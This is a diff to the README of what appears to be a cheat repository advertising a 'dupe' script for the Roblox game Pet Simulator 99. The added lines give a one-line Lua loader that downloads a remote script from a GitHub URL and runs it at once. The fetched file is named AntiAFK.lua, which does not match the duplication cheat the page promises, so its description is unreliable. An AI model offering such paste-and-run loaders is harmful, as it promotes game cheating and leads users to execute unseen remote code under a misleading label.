@@ -1,2 +1,6 @@
 # Ps99Dupe✅
-Dupe for Pet Simulator 99. Working and Tested in 01/24/2024. ✅
+. A simple script to dupe in pet simulator 99. Working and Tested in 01/24/2024. ✅
+```lua
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NoTwistedHere/Roblox/main/AntiAFK.lua"))()
+```
+
